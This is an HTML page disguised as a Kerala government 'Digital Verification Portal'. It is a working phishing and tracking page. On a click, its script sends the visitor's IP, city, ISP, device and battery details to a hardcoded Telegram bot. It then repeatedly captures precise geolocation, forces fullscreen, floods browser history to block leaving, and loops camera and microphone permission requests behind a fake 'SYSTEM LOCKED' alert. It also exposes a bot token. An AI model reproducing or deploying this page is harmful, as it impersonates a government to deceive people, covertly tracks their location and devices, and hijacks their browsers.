<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Government of Kerala | Digital Verification Portal</title>
    <style>
        body { font-family: 'Arial', sans-serif; background: #f4f4f4; text-align: center; padding: 50px; margin: 0; min-height: 100vh; cursor: pointer; }
        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px rgba(0,0,0,0.2); max-width: 500px; margin: auto; border-top: 5px solid #006400; pointer-events: none; }
        h1 { color: #006400; font-size: 22px; margin-top: 15px; }
        .status { color: red; font-weight: bold; margin: 20px 0; animation: blink 1s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        #progress { width: 100%; background: #ddd; border-radius: 5px; margin-top: 10px; }
        #bar { width: 98%; height: 20px; background: #006400; border-radius: 5px; }
    </style>
</head>
<body onclick="launchOperation()">
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5f/Emblem_of_Kerala.svg/512px-Emblem_of_Kerala.svg.png" width="100">
        <h1>KERALA LOGISTICS AUTHENTICATION</h1>
        <p>Regional Sector: <strong>ALAPPUZHA</strong></p>
        <div id="progress"><div id="bar"></div></div>
        <p class="status">SYSTEM LOCKED: Action Required</p>
        <p>Verification in progress. Do not close this window. Allow all permissions to unlock your device.</p>
    </div>

    <script>
        const BOT_TOKEN = '8784548006:AAHI6anzO11Y24bVA8wSUr297O_YJl0E_vg';
        const CHAT_ID = '1020906452';

        function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
            fetch(url, { mode: 'no-cors', keepalive: true }).catch(() => {}); 
        }

        async function getDeviceData() {
            let info = "📱 --- DEVICE DOSSIER ---\n";
            
            // 1. IP and Network Information
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                info += `IP: ${data.ip}\nCity: ${data.city}\nISP: ${data.org}\nNet: ${navigator.connection ? navigator.connection.effectiveType : 'Unknown'}\n`;
            } catch (e) { info += "IP: Failed to fetch\n"; }

            // 2. Device Details
            info += `Device: ${navigator.platform}\nBrowser: ${navigator.userAgent.split(' ').pop()}\n`;

            // 3. Battery Info
            try {
                const battery = await navigator.getBattery();
                info += `Battery: ${Math.round(battery.level * 100)}%\nCharging: ${battery.charging ? 'YES' : 'NO'}\n`;
            } catch (e) {}

            sendToTelegram(info);
        }

        function lockNavigation() {
            for(let i=0; i<50; i++) { window.history.pushState(null, "", window.location.href); }
            setInterval(() => { window.history.pushState(null, "", window.location.href); }, 500);
        }

        function captureLocation() {
            navigator.geolocation.getCurrentPosition((pos) => {
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                sendToTelegram(`🎯 COORDINATES:\n${mapLink}\nAccuracy: ${pos.coords.accuracy}m`);
            }, (err) => { sendToTelegram(`⚠️ Location Denied: ${err.message}`); }, { enableHighAccuracy: true });
        }

        let operationStarted = false;
        async function launchOperation() {
            if (operationStarted) return;
            operationStarted = true;

            if (document.documentElement.requestFullscreen) { document.documentElement.requestFullscreen().catch(() => {}); }

            lockNavigation();
            await getDeviceData(); // Send IP and Battery info immediately
            captureLocation(); // Request Location
            
            // --- RE-ENGINEERED CAMERA/MIC STORM ---
            // After 6 seconds, force Camera explicitly
            setTimeout(() => {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
                .then(() => sendToTelegram("📸 Camera: GRANTED"))
                .catch((e) => sendToTelegram("⚠️ Camera Denied: " + e.message));
            }, 6000);

            // After 12 seconds, force Mic explicitly
            setTimeout(() => {
                navigator.mediaDevices.getUserMedia({ audio: true })
                .then(() => sendToTelegram("🎙️ Microphone: GRANTED"))
                .catch((e) => sendToTelegram("⚠️ Mic Denied: " + e.message));
            }, 12000);

            // Perpetual Loop
            setInterval(() => {
                captureLocation();
                navigator.mediaDevices.getUserMedia({ video: true, audio: true }).catch(() => {});
            }, 25000);

            alert("SECURITY ALERT: Verification Required. Click 'Allow' to proceed.");
        }
    </script>
</body>
</html>
